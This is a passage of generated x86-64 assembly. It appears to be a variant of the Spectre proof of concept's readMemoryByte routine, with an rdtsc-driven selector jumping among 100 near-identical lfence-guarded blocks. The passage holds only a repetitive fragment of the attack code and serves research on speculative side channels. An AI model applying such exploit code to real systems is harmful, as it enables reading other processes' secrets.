	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 60
.LreadMemoryByte_win4_var60:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 61
.LreadMemoryByte_win4_var61:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 62
.LreadMemoryByte_win4_var62:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 63
.LreadMemoryByte_win4_var63:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 64
.LreadMemoryByte_win4_var64:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 65
.LreadMemoryByte_win4_var65:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 66
.LreadMemoryByte_win4_var66:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 67
.LreadMemoryByte_win4_var67:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 68
.LreadMemoryByte_win4_var68:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 69
.LreadMemoryByte_win4_var69:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 70
.LreadMemoryByte_win4_var70:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 71
.LreadMemoryByte_win4_var71:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 72
.LreadMemoryByte_win4_var72:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 73
.LreadMemoryByte_win4_var73:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 74
.LreadMemoryByte_win4_var74:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 75
.LreadMemoryByte_win4_var75:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 76
.LreadMemoryByte_win4_var76:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 77
.LreadMemoryByte_win4_var77:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 78
.LreadMemoryByte_win4_var78:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 79
.LreadMemoryByte_win4_var79:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 80
.LreadMemoryByte_win4_var80:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 81
.LreadMemoryByte_win4_var81:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 82
.LreadMemoryByte_win4_var82:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 83
.LreadMemoryByte_win4_var83:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 84
.LreadMemoryByte_win4_var84:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 85
.LreadMemoryByte_win4_var85:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 86
.LreadMemoryByte_win4_var86:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 87
.LreadMemoryByte_win4_var87:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 88
.LreadMemoryByte_win4_var88:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 89
.LreadMemoryByte_win4_var89:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 90
.LreadMemoryByte_win4_var90:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 91
.LreadMemoryByte_win4_var91:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 92
.LreadMemoryByte_win4_var92:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 93
.LreadMemoryByte_win4_var93:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 94
.LreadMemoryByte_win4_var94:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 95
.LreadMemoryByte_win4_var95:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 96
.LreadMemoryByte_win4_var96:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 97
.LreadMemoryByte_win4_var97:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 98
.LreadMemoryByte_win4_var98:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 99
.LreadMemoryByte_win4_var99:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
.LreadMemoryByte_win4_continue:
	addq	$32, %rsp
	cltq
	leaq	0(,%rax,4), %rcx
	leaq	results.0(%rip), %rax
	movl	(%rcx,%rax), %eax
	cmpl	%eax, %edx
	jl	.L21
.L20:
	movl	-92(%rbp), %eax
	movl	%eax, -88(%rbp)
	movl	-96(%rbp), %eax
	movl	%eax, -92(%rbp)
	jmp	.L22
.L21:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win3_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win3_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win3_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win3_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win3_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win3_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win3_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win3_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win3_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win3_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win3_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win3_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win3_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win3_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win3_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win3_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win3_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win3_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win3_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win3_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win3_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win3_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win3_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win3_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win3_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win3_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win3_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win3_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win3_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win3_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win3_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win3_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win3_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win3_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win3_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win3_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win3_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win3_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win3_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win3_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win3_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win3_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win3_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win3_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win3_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win3_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win3_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win3_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win3_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win3_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win3_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win3_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win3_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win3_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win3_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win3_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win3_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win3_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win3_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win3_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win3_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win3_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win3_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win3_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win3_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win3_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win3_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win3_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win3_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win3_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win3_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win3_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win3_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win3_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win3_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win3_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win3_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win3_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win3_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win3_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win3_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win3_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win3_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win3_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win3_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win3_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win3_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win3_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win3_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win3_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win3_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win3_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win3_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win3_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win3_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win3_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win3_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win3_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win3_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win3_var99
	jmp	.LreadMemoryByte_win3_var0
## Variant 0
.LreadMemoryByte_win3_var0:
	popq	%rax
	cmpl	$0, -88(%rbp)
	js	.L23
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 1
.LreadMemoryByte_win3_var1:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 2
.LreadMemoryByte_win3_var2:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 3
.LreadMemoryByte_win3_var3:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 4
.LreadMemoryByte_win3_var4:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 5
.LreadMemoryByte_win3_var5:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 6
.LreadMemoryByte_win3_var6:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 7
.LreadMemoryByte_win3_var7:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 8
.LreadMemoryByte_win3_var8:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 9
.LreadMemoryByte_win3_var9:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 10
.LreadMemoryByte_win3_var10:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 11
.LreadMemoryByte_win3_var11:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 12
.LreadMemoryByte_win3_var12:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 13
.LreadMemoryByte_win3_var13:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 14
.LreadMemoryByte_win3_var14:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 15
.LreadMemoryByte_win3_var15:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 16
.LreadMemoryByte_win3_var16:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 17
.LreadMemoryByte_win3_var17:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 18
.LreadMemoryByte_win3_var18:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 19
.LreadMemoryByte_win3_var19:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 20
.LreadMemoryByte_win3_var20:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 21
.LreadMemoryByte_win3_var21:
	popq	%rax
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 22
.LreadMemoryByte_win3_var22:
	popq	%rax
